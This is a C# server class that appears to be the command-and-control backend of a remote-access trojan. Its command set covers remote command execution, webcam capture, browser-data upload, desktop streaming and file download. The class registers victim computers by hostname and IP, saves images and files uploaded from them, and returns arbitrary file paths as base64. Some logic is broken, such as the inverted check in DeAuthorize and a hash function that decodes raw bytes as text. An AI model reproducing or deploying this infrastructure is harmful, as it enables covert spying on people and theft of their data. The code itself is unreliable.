using Library;
using Models;
using Newtonsoft.Json;
using Library;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using System.Web.Helpers;

namespace Server.Classes
{
    public enum Command
    {
        UPLOAD_IMAGE,
        UPLOAD_SENTENCES,
        UPLOAD_WEBCAM_IMAGE,
        EXECUTE_COMMAND,
        UPLOAD_PORT_INFO,
        UPLOAD_BROWSER_DATA,
        DOWNLOAD_FILE,
        UPLOAD_FILE_EVENTS,
        STREAM_DESKTOP,
        STOP_STREAM_DESKTOP,
        MOVE_CURSOR,
        DO_NOTHING
    }

    public class RhsApi
    {
        public class Keys
        {
            public string Public { get; set; }
            public string Private { get; set; }
        }


        private static string publicKey;
        private static string privateKey;
        private static string dateformat = "MMM ddd d HH:mm:ss yyyy";// "Y-m-d H:i:s";

        private static string SHA1(string str)
        {
            using (SHA1Managed sha1 = new SHA1Managed())
            {
                return Encoding.UTF8.GetString(sha1.ComputeHash(Encoding.UTF8.GetBytes(str)));
            }
        }

        public static Keys Generate()
        {
            return new Keys()
            {
                Public = SHA1(RhsApi.mt_rand_str(40)),
                Private = SHA1(RhsApi.mt_rand_str(40))
            };
        }

        public static string GetFileContents(string path, string file)
        {
            return System.IO.File.ReadAllText(GetFile(path, file));
        }

        public static string GetFileContents(string fullpath)
        {
            return System.IO.File.ReadAllText(fullpath);
        }

        public static string GetFile(string path, string file)
        {
            // Some browsers send file names with full path. We only care about the file name.
            return Path.Combine(HttpContext.Current.Server.MapPath("~/App_Data/" + path), Path.GetFileName(file));
        }

        //private static string GetFileData(string file)
        //{
        //    return File.ReadAllText(HttpContext.Current.Server.MapPath(file));
        //}

        private static Keys GetKeys()
        {
            return JsonConvert.DeserializeObject<Keys>(GetFileContents("Data", "keys.json"));// GetFileData("~/Data/keys.json"));
        }

        public static AuthResult Authorize(AuthData data)
        {
            Keys keys = GetKeys();
            if (keys != null && keys.Public.Equals(data.PublicKey))
            {
                var privateKey = keys.Private;
                var hashCheck = General.Sha1Hash(data.Data + privateKey + data.PublicKey);
                if (hashCheck.Equals(data.Hash))
                {
                    var newToken = General.Sha1Hash(privateKey + hashCheck + GetDateTimeFormatted());
                    //var file = "~/Data/clients.json";
                    var computersJsonFile = GetFile("Data", "computers.json");// "~/Data/computers.json";
                    //var clients = new List<Client>();
                    var computers = new List<ComputerData>();
                    try
                    {
                        //clients = JsonConvert.DeserializeObject<List<Client>>(GetFileData(file));
                        computers = JsonConvert.DeserializeObject<List<ComputerData>>(GetFileContents(computersJsonFile));//GetFileData(computersJsonFile));
                    }
                    catch { }
                    
                    var computerData = new ComputerData()
                    {
                        Name = data.HostName,
                        IpExternal = data.IpExternal,
                        IpInternal = data.IPInternal,
                        LastActive = "",
                        Hash = null
                    };
                    computerData.Hash = Transmitter.GetComputerHash(computerData);
                    //if (clients.Where(c => c.ExternalAddress == ipExternal).FirstOrDefault() == null)
                    if (computers.Where(c => c.Hash == computerData.Hash).FirstOrDefault() == null)
                    {
                        //clients.Add(new Client() 
                        //{ 
                        //    ExternalAddress = ipExternal 
                        //});
                        computers.Add(computerData); 
                    }

                    //var clientsJson = JsonConvert.SerializeObject(clients);
                    //File.WriteAllText(HttpContext.Current.Server.MapPath(file), clientsJson);

                    var computersJson = JsonConvert.SerializeObject(computers);
                    File.WriteAllText(computersJsonFile, computersJson);// HttpContext.Current.Server.MapPath(computersJsonFile), computersJson);

                    return new AuthResult()
                    {
                        Token = newToken,
                        IpExternal = data.IpExternal
                    };
                }
            }
            return null;
        }

        public static bool DeAuthorize(AuthData data)
        {
            Keys keys = GetKeys();
            if (keys != null && keys.Public.Equals(data.PublicKey))
            {
                var privateKey = keys.Private;
                var hashCheck = General.Sha1Hash(data.Data + privateKey + data.PublicKey);
                if (hashCheck.Equals(data.Hash))
                {
                    var newToken = General.Sha1Hash(privateKey + hashCheck + GetDateTimeFormatted());
                    var computersJsonFile = GetFile("Data", "computers.json");// "~/Data/computers.json";

                    var computers = new List<ComputerData>();
                    try
                    {
                        computers = JsonConvert.DeserializeObject<List<ComputerData>>(GetFileContents(computersJsonFile));// GetFileData(computersJsonFile));
                    }
                    catch { }

                    var computerData = new ComputerData()
                    {
                        Name = data.HostName,
                        IpExternal = data.IpExternal,
                        IpInternal = data.IPInternal,
                        LastActive = "",
                        Hash = null
                    };
                    computerData.Hash = Transmitter.GetComputerHash(computerData);
                    if (computers.Where(c => c.Hash == computerData.Hash).FirstOrDefault() == null)
                    {
                        computers.Remove(computerData);
                    }
                    var computersJson = JsonConvert.SerializeObject(computers);
                    File.WriteAllText(GetFileContents(computersJsonFile), computersJson);// HttpContext.Current.Server.MapPath(computersJsonFile), computersJson);

                    return true;
                }
            }
            return false;
        }

        // php time()
        private static double GetTime()
        {
            return (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
        }

        public static string GetDateTime(double time)
        {
            return DateTime.Now.ToString(dateformat);// new DateTime((long)GetTime()).ToString(dateformat);// DateTime.Now.ToString(dateformat);
            //return date(RHS_API::$dateformat, $time);
        }

        public static string GetDateTimeFormatted()
        {
            return GetDateTime(GetTime());
        }

        public static int? UploadImage(string data)
        {
            try
            {
                //var file = "~/DataFromClient/" + DateTime.Now.Ticks + ".jpg";
                var file = "~/DataFromClient/latest.jpg";
                var content = Convert.FromBase64String(data);
                File.WriteAllBytes(GetFile("DataFromClient", "latest.jpg"), content);//HttpContext.Current.Server.MapPath(file), content);
                return data.Length;
            }
            catch { }
            return null;
        }

        public static int? UploadFile(FileData data)
        {
            try
            {
                byte[] bytes = Convert.FromBase64String(data.Data);
                var fileName = data.FileNameWithExtension;
                File.WriteAllBytes(GetFile("DataFromClient", fileName), bytes);//HttpContext.Current.Server.MapPath("~/DataFromClient/" + fileName), bytes);
                return bytes.Length;
            }
            catch { }
            return null;
        }

        public static string DownloadFile(string file)
        {
            try
            {
                return Convert.ToBase64String(File.ReadAllBytes(file));
            }
            catch { }
            return null;
        }

        //private static Transmitter.Settings GetSettings(string token)
        //{
        //    try
        //    {
        //        return JsonConvert.DeserializeObject<Transmitter.Settings>(GetFileData("~/Data/settings.json"));
        //    }
        //    catch { }
        //    return new Transmitter.Settings();
        //}

        public static Settings GetSettings()
        {
            return JsonConvert.DeserializeObject<Settings>(GetFileContents("Data", "settings.json"));// GetFileData("~/Data/settings.json"));
            //var settings = GetSettings(token);
            //if (settings != null)
            //    return settings.Command;
            //return Transmitter.ECommand.DO_NOTHING;
        }

        internal static int? SaveSettings(Settings settingsEncoded)
        {
            try
            {
                var file = GetFile("Data", "settings.json");
                //byte[] bytes = Convert.FromBase64String(settingsEncoded);
                byte[] bytes = Encoding.Default.GetBytes(JsonConvert.SerializeObject(settingsEncoded));
                File.WriteAllBytes(file, bytes);
                return bytes.Length;
            }
            catch { }
            return null;
        }

        public static string GetComputerHash(string computerName)
        {
            var data = JsonConvert.DeserializeObject<List<ComputerData>>(GetFileContents("Data", "computers.json"));//GetFileData("~/Data/computers.json"));
            var computer = data.Where(c => c.Name == computerName).FirstOrDefault();
            if (computer != null)
            {
                return Transmitter.GetComputerHash(computer);
            }
            return null;
        }



        //public static void DeAuthorize(string tokenValue)
        //{

        //}

        //private static ResetToken(bool datetimeValid, string tokenValue) {
        //    var dateInPast = GetDateTimeFormatted();
        //    dateInPast.
        //    $dateInPast->sub(new DateInterval($datetimeValid));
        //    return DB::update('CWM_ApiKeySession', array('LastAccess' => $dateInPast, 'TokenValue' => ''), "TokenValue=%?", $tokenValue);
        //}

        /*

        public static function deAuthorize($tokenValue) {
            return RHS_API::resetToken("P1D", $tokenValue);
        }

        private static function resetToken($datetimeValid, $tokenValue) {
            $dateInPast = new DateTime(RHS_API::getDateTime(time()));
            $dateInPast->sub(new DateInterval($datetimeValid));
            return DB::update('CWM_ApiKeySession', array('LastAccess' => $dateInPast, 'TokenValue' => ''), "TokenValue=%?", $tokenValue);
        }

        public static function isTokenValid($newTokenValue) {
            $datetimeValid = "P1D"; // valid for 1 day
            $result = false;
            $lastAccess = RHS_API::getDateTime(strtotime(DB::queryOneField('LastAccess', 'SELECT * FROM CWM_ApiKeySession WHERE TokenValue=%?', $newTokenValue)));
            $lastAccess = new DateTime($lastAccess);
            $lastAccess->add(new DateInterval($datetimeValid));
            $result = new DateTime(RHS_API::getDateTime(time())) < $lastAccess;
            // if not valid, update the date to be in the past
            if(!$result) {
                RHS_API::resetToken($datetimeValid, $newTokenValue);
            }
            return $result;
        }

        public static function formatDateTime($datetime) {
            return $datetime->format(RHS_API::$dateformat);
        }
        */
        public static string getAsJson(object data)
        {
            //header('content-type: application/json; charset=utf-8');
            return Json.Encode(data);
        }

        private static string mt_rand_str(int amount, string chars = "abcdefghijklmnopqrstuvwxyz1234567890")
        {
            var random = new Random();
            var result = new string(
                Enumerable.Repeat(chars, amount)
                          .Select(s => s[random.Next(s.Length)])
                          .ToArray());
            return result;
        }
    }
}